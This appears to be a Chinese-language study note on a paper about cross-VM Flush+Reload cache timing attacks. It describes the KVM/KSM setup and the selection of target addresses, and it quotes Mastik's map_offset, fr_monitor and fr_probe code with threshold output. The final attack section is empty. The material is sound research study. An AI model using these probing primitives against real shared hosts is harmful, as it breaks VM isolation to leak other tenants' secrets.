# Cross-VM Flush+Reload Attack[^1]

本文分析了虚拟化环境中侧信道攻击的生命周期，深入分析了环境、攻击设置、攻击执行以及攻击利用等方面，复现跨虚拟机的 Flush+Reload 缓存计时攻击。

主要两部分：攻击方法和结果分析。

攻击方法逐步解释了跨虚拟机 F+R 攻击的细节，包括攻击环境、硬件、操作系统、软件、攻击代码和攻击执行的细节。在 Linux 上实现。

然后讨论了攻击者如何收集和分析结果，结果集分析和实时监控两种方法。

## 攻击方法论

三个阶段，setup、attack、analysis。

### 攻击环境设置

宿主机和虚拟机都是 Ubuntu 16.04.1, QEMU-KVM v2.6.2 当时最新的版本，使用默认设置，KSM 默认开启。

受害者虚拟机运行下面提到的 *Hello* 程序，攻击者虚拟机上有攻击程序、分析工具以及 *Hello* 程序的副本。

### 寻找目标地址

缓存侧信道攻击的目标是程序中的特定地址，对应攻击者感兴趣的代码。选择地址很重要，代码相邻或时间位置都可能影响结果。比如，受害者运行一个循环，攻击者以循环内或附近的地址为目标，在循环的持续时间内，攻击者将不断地收到定时攻击的反馈。攻击者可以据此监视循环的持续时间，但如果每次运行函数只需要反馈一次，则需要将地址指向函数开头或结尾，每次运行只执行一次。

还有就是选择地址不能太接近另一个无关的函数代码，如果调用了这个无关函数，就可能导致误报。一般是根据空间和时间局部性原理，将整个页面加载到 LLC 中，这些页中的一些缓存行会被进一步加载到 L1 和 L2。

Gruss[^2] 等人开发了一种通过精确猜测自动定位感兴趣地址的方法。它们的方法从整个目标程序中的一个地址集开始，当触发想要监视的功能时，观察每一个地址。未触发的地址从测试集中删除，直到地址集所包含的地址可以指示希望监视的功能。

### Mastik 框架

Yuval[^3] 开发了 Mastik 框架，提供了侧信道攻击的实现。可以在虚拟机之间部署 Mastik 的 Flush+Reload 攻击，不需要额外的技术或代码。0.02 版本包含了以下几种侧信道攻击：

- Prime+Probe on the L1 data cache 
- Prime+Probe on the L1 instruction cache 
- Prime+Probe on the Last-Level Cache 
- Flush+Reload 
- Flush+Flush (new in 0.02) 
- Performance degradation attack (new in 0.02).

使用 Mastik 的 F+R 库，可以创建一个对象，将目标代码加载到内存中，存储要探测的目标地址，然后执行 F+R 攻击。主要函数由 `map_offset` 将目标代码加载到内存，`fr_monitor` 将目标地址添加到受监视的地址列表，`fr_probe` 执行攻击并返回访问目标地址所需的大致周期数。

#### `map_offset`

```c
void *map_offset(const char *file, uint64_t offset) {
  int fd = open(file, O_RDONLY);
  if (fd < 0)
    return NULL;
  
  char *mapaddress = MAP_FAILED;
#ifdef HAVE_MMAP64
  mapaddress = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, offset & ~(sysconf(_SC_PAGE_SIZE) -1));
#else
  mapaddress = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, ((off_t)offset) & ~(sysconf(_SC_PAGE_SIZE) -1));
#endif
  close(fd);
  if (mapaddress == MAP_FAILED)
    return NULL;
  return (void *)(mapaddress+(offset & (sysconf(_SC_PAGE_SIZE) -1)));
}
```

`map_offset` 函数将目标代码作为只读文件加载到内存中，实际由 `mmap` 系统调用完成映射。通过指定页对齐的偏移将文件的特定部分映射到内存中。

#### `fr_monitor`

```c
int fr_monitor(fr_t fr, void *adrs) {   
    assert(fr != NULL);   
    assert(adrs != NULL);   
    if (vl_find(fr->vl, adrs) >= 0)     
        return 0;   
    vl_push(fr->vl, adrs);   
    return 1; 
} 

// vlist.h
typedef struct vlist *vlist_t;  
struct vlist {   
    int size;   
    int len;   
    void **data; 
};

vlist_t vl_new(); 
void vl_free(vlist_t vl);  
inline void *vl_get(vlist_t vl, int ind); 
void vl_set(vlist_t vl, int ind, void *dat); 
int vl_push(vlist_t vl, void *dat); 
void *vl_pop(vlist_t vl); 
void *vl_poprand(vlist_t vl); 
void *vl_del(vlist_t vl, int ind); 
inline int vl_len(vlist_t vl); 
void vl_insert(vlist_t vl, int ind, void *dat); 
int vl_find(vlist_t vl, void *dat);
```

`fr_monitor` 接受一个地址，将其添加到要监视的目标地址数组中，每个地址都用 `fr_probe` 探测计时，为每个地址返回单独的计时结果。

#### `fr_probe`

```c
void fr_probe(fr_t fr, uint16_t *results) {
  assert(fr != NULL);
  assert(results != NULL);
  int l = vl_len(fr->vl);
  for (int i = 0; i < l; i++)  {
    void *adrs = vl_get(fr->vl, i);
    int res = memaccesstime(adrs);
    results[i] = res > UINT16_MAX ? UINT16_MAX : res;
    clflush(adrs);
  }
  l = vl_len(fr->evict);
  for (int i = 0; i < l; i++) 
    clflush(vl_get(fr->evict, i));
}
```

`fr_probe` 遍历目标地址列表，测量每个地址的访问时间。

为了帮助设置环境和执行攻击，Mastik 提供了收集系统信息的工具，如 *FR-threshold* 用来测试从 LLC 和内存访问数据的时间。

```shell
$ ./FR-threshold
             :  Mem  Cache
Minimum      :    67    37
Bottom decile:   179    67
Median       :   190    70
Top decile   :   229    77
Maximum      : 35587 20129
```

### Cross-VM Cache Timing Attack





[^1]:Danny Philippe-Jankovic and Tanveer A Zia, Breaking VM Isolation – An In-Depth Look into the Cross VM Flush Reload Cache Timing Attack, IJCSNS 2017.
[^2]:Daniel Gruss, Raphael Spreitzer, and Stefan Mangard, Cache Template Attacks: Automating Attacks on Inclusive Last-Level Caches, USENIX 2015.
[^3]:Yuval Yarom et al, https://github.com/Secure-AI-Systems-Group/Mastik.

